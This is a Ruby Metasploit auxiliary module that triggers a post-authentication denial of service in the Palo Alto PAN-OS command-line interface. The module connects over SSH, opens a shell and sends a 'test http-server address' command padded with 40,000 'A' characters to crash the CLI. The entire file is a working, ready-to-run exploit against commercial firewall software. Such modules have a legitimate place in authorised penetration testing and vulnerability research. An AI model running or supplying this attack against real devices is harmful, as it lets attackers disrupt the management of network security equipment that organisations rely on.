##
# This module requires Metasploit Framework and compatible Ruby.
##

require 'msf/core'
require 'net/ssh'

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::SSH
  include Msf::Auxiliary::Scanner

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'Palo Alto PAN-OS CLI Crash (Post-Auth)',
      'Description' => %q{
        This module triggers a denial-of-service condition in the CLI of
        Palo Alto PAN-OS by sending an overly long input after authentication.
      },
      'Author'      => [ 'Cody Sixteen' ],
      'License'     => MSF_LICENSE,
      'References'     => [
        ['URL', 'https://code610.blogspot.com/2025/05/palo-alto-postauth-cli-memory.html']
      ],
      'DisclosureDate' => 'May 25 2025'
    ))

    register_options(
      [
        Opt::RPORT(22),
        OptString.new('USERNAME', [true, 'SSH username']),
        OptString.new('PASSWORD', [true, 'SSH password'])
      ]
    )
  end

  def run_host(ip)
    rport = datastore['RPORT']

    begin
      print_status("[*] Connecting to #{ip}:#{rport} via SSH...")
      Net::SSH.start(ip, datastore['USERNAME'], password: datastore['PASSWORD'], port: rport, non_interactive: true, timeout: 10) do |ssh|
        print_good("[+] SSH connection established to #{ip}")

        ssh.open_channel do |channel|
          pty_opts = { term: 'xterm', chars_wide: 80, chars_high: 24, modes: {} }

          channel.request_pty(pty_opts) do |pty, success|
            if success
              print_good("[+] PTY successfully allocated")

              channel.send_channel_request("shell") do |ch, success_shell|
                if success_shell
                  print_good("[+] Shell channel opened. Sending payload...")

                  crash_cmd = "test http-server address " + "A" * 40000 + "\n"
                  channel.send_data(crash_cmd)

                  channel.on_data do |_ch, data|
                    print_line("[remote] #{data}")
                  end

                  channel.on_extended_data do |_ch, type, data|
                    print_line("[remote][stderr] #{data}")
                  end

                  # send exit after 1 sec. (time for payload to load)
                  Rex.sleep(1)
                  channel.send_data("exit\n")
                else
                  print_error("[-] Failed to open shell channel")
                end
              end
            else
              print_error("[-] PTY request failed")
            end
          end

          channel.on_close do |_ch|
            print_status("[*] SSH channel closed.")
          end
        end

        ssh.loop
      end
    rescue Net::SSH::AuthenticationFailed
      print_error("[-] Authentication failed for #{ip}")
    rescue Net::SSH::Exception => e
      print_error("[-] SSH connection error with #{ip}: #{e.message}")
    rescue => e
      print_error("[-] Unexpected error: #{e.message}")
    end
  end
end

